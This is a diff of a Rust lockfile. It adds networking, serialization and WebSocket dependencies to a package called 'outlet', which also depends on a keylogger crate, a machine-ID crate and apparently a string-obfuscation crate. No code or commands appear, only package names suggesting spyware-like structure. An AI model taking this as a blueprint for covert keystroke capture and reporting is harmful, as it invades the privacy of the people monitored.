@@ -1823,14 +1823,19 @@ dependencies = [
 name = "outlet"
 version = "0.1.0"
 dependencies = [
+ "chrono",
  "env_logger",
+ "futures-util",
  "log",
  "machine-uid",
  "muddy",
  "once_cell",
  "oxalate_keylogger",
  "reqwest",
+ "serde",
+ "serde_json",
  "tokio",
+ "tokio-tungstenite",
 ]
 
 [[package]]
@@ -1866,6 +1871,7 @@ dependencies = [
 name = "oxalate_keylogger"
 version = "0.1.0"
 dependencies = [
+ "log",
  "rdev",
  "thiserror",
  "tokio",
